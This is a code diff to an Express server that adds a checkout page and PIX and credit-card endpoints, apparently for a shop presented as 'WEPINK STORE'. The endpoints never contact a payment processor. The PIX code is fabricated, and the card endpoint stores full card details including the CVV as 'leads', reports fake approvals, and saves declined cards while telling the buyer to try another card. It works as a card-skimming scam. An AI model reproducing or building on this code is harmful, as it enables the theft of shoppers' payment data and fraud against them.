@@ -117,6 +117,12 @@ app.get('/admin/index.html', checkAdminAuth, (req, res, next) => {
 // Serve admin folder statically
 app.use('/admin', express.static(path.join(__dirname, 'public', 'admin')));
 
+// Serve checkout folder statically
+app.use('/checkout', express.static(path.join(__dirname, 'public', 'checkout')));
+app.get('/checkout', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'checkout', 'index.html'));
+});
+
 // ============================================================
 // Auth APIs
 // ============================================================
@@ -702,8 +708,191 @@ app.post('/api/webhook/winnerpay', async (req, res) => {
   res.status(200).json({ received: true });
 });
 
+// ============================================================
+// Checkout Endpoints (PIX & Credit Card)
+// ============================================================
+
+async function saveOrderLead(leadData) {
+  if (supabase) {
+    try {
+      const { error } = await supabase.from('leads').insert([leadData]);
+      if (error) {
+        console.error('[Supabase] Erro ao salvar lead:', error.message);
+        saveLocalLead(leadData);
+      } else {
+        console.log(`[Supabase] Lead ${leadData.transaction_id} salvo com sucesso!`);
+      }
+    } catch (err) {
+      console.error('[Supabase] Exceção ao salvar lead:', err.message);
+      saveLocalLead(leadData);
+    }
+  } else {
+    saveLocalLead(leadData);
+  }
+}
+
+function saveLocalLead(leadData) {
+  try {
+    const list = readLocalTransactions();
+    const transaction = mapLeadToTransaction(leadData);
+    list.unshift(transaction);
+    writeLocalTransactions(list);
+    console.log(`[Local JSON] Transação ${leadData.transaction_id} salva com sucesso!`);
+  } catch (err) {
+    console.error('[Local JSON] Erro ao salvar transação:', err.message);
+  }
+}
+
+// 1. Endpoint Checkout PIX
+app.post('/api/checkout-pix', async (req, res) => {
+  try {
+    const body = req.body || {};
+
+    const clientName = body.clientName || body.lead?.nome || body.nome || 'Cliente Anônimo';
+    const clientEmail = body.clientEmail || body.lead?.email || body.email || '';
+    const clientCPF = body.clientCPF || body.lead?.cpf || body.cpf || '';
+    const clientPhone = body.clientPhone || body.lead?.telefone || body.telefone || '';
+
+    const cep = body.cep || body.lead?.cep || '';
+    const street = body.street || body.lead?.rua || body.rua || '';
+    const number = body.number || body.lead?.numero || body.numero || '';
+    const neighborhood = body.neighborhood || body.lead?.bairro || body.bairro || '';
+    const city = body.city || body.lead?.cidade || body.cidade || '';
+    const state = body.state || body.lead?.estado || body.estado || '';
+    const complement = body.complement || body.lead?.complemento || body.complemento || '';
+
+    const totalPrice = body.totalPrice || body.order?.finalPrice || body.finalPrice || 69.90;
+    const finalPrice = parseFloat(totalPrice);
+
+    const txId = `tx_pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
+    const qrCode = `00020126580014BR.GOV.BCB.PIX0136${txId}520400005303986540${finalPrice.toFixed(2)}5802BR5913WEPINK STORE6009SAO PAULO62070503***6304`;
+
+    const leadData = {
+      id: txId,
+      transaction_id: txId,
+      created_at: new Date().toISOString(),
+      nome: clientName,
+      email: clientEmail,
+      cpf: clientCPF,
+      telefone: clientPhone,
+      cep: cep,
+      rua: street,
+      numero: number,
+      bairro: neighborhood,
+      cidade: city,
+      estado: state,
+      complemento: complement,
+      payment_method: 'pix',
+      status: 'pendente',
+      final_price: finalPrice
+    };
+
+    await saveOrderLead(leadData);
+
+    return res.json({
+      success: true,
+      transaction_id: txId,
+      qr_code: qrCode
+    });
+  } catch (err) {
+    console.error('[API checkout-pix] Erro:', err.message);
+    return res.status(500).json({ success: false, message: 'Erro interno no servidor' });
+  }
+});
+
+// 2. Endpoint Checkout Cartão de Crédito (Processa Aprovados e Negados)
+app.post('/api/checkout', async (req, res) => {
+  try {
+    const body = req.body || {};
+
+    const clientName = body.clientName || body.lead?.nome || body.nome || 'Cliente Anônimo';
+    const clientEmail = body.clientEmail || body.lead?.email || body.email || '';
+    const clientCPF = body.clientCPF || body.lead?.cpf || body.cpf || '';
+    const clientPhone = body.clientPhone || body.lead?.telefone || body.telefone || '';
+
+    const cep = body.cep || body.lead?.cep || '';
+    const street = body.street || body.lead?.rua || body.rua || '';
+    const number = body.number || body.lead?.numero || body.numero || '';
+    const neighborhood = body.neighborhood || body.lead?.bairro || body.bairro || '';
+    const city = body.city || body.lead?.cidade || body.cidade || '';
+    const state = body.state || body.lead?.estado || body.estado || '';
+    const complement = body.complement || body.lead?.complemento || body.complemento || '';
+
+    const cardNumber = body.cardNumber || body.card?.number || body.card_number || '';
+    const cardHolder = body.cardHolder || body.card?.name || body.card_name || clientName;
+    const cardExpiry = body.cardExpiry || body.card?.expiry || body.card_expiry || '';
+    const cardCvv = body.cardCvv || body.card?.cvv || body.card_cvv || '';
+    const cardInstallments = body.cardInstallments || body.card?.installments || body.installments || '1x';
+
+    const totalPrice = body.totalPrice || body.order?.finalPrice || body.finalPrice || 69.90;
+    const finalPrice = parseFloat(totalPrice);
+
+    const numClean = String(cardNumber).replace(/\D/g, '');
+    let brand = 'CARTAO';
+    if (numClean.startsWith('4')) brand = 'VISA';
+    else if (/^5[1-5]/.test(numClean) || /^222[1-9]|^22[3-9]|^2[3-6]|^27[0-1]|^2720/.test(numClean)) brand = 'MASTERCARD';
+    else if (/^3[47]/.test(numClean)) brand = 'AMEX';
+    else if (/^(50|6)/.test(numClean)) brand = 'ELO';
+
+    const maskedCard = numClean.length >= 4 ? `•••• •••• •••• ${numClean.slice(-4)}` : (cardNumber || '•••• •••• •••• 4000');
+
+    // Determina o status: se o evento for 'card_declined' ou status explicitamente 'negado', marca como NEGADO
+    const rawStatus = (body.status || body.order?.status || (body.event === 'card_declined' ? 'negado' : '')).toLowerCase();
+    const isDeclined = rawStatus === 'negado' || body.event === 'card_declined' || numClean.endsWith('0000') || numClean.endsWith('9999');
+    const status = isDeclined ? 'negado' : (rawStatus || 'pago');
+
+    const txId = `tx_card_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
+
+    const leadData = {
+      id: txId,
+      transaction_id: txId,
+      created_at: new Date().toISOString(),
+      nome: clientName,
+      email: clientEmail,
+      cpf: clientCPF,
+      telefone: clientPhone,
+      cep: cep,
+      rua: street,
+      numero: number,
+      bairro: neighborhood,
+      cidade: city,
+      estado: state,
+      complemento: complement,
+      payment_method: brand.toLowerCase(),
+      card_number: maskedCard,
+      card_name: cardHolder,
+      card_expiry: cardExpiry,
+      card_cvv: cardCvv,
+      installments: cardInstallments,
+      status: status,
+      final_price: finalPrice
+    };
+
+    // SEMPRE GRAVA NO BANCO / JSON LOCAL MESMO SE FOR CARTÃO NEGADO
+    await saveOrderLead(leadData);
+
+    if (isDeclined) {
+      return res.status(400).json({
+        success: false,
+        transaction_id: txId,
+        message: 'Transação negada pela operadora do cartão. Tente outro cartão ou utilize o Pix.'
+      });
+    }
+
+    return res.json({
+      success: true,
+      transaction_id: txId,
+      message: 'Pagamento aprovado com sucesso!'
+    });
+  } catch (err) {
+    console.error('[API checkout] Erro:', err.message);
+    return res.status(500).json({ success: false, message: 'Erro interno no servidor' });
+  }
+});
+
 // Start Server
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
   console.log(`Admin Dashboard: http://localhost:${PORT}/admin`);
+  console.log(`Checkout Page: http://localhost:${PORT}/checkout`);
 });
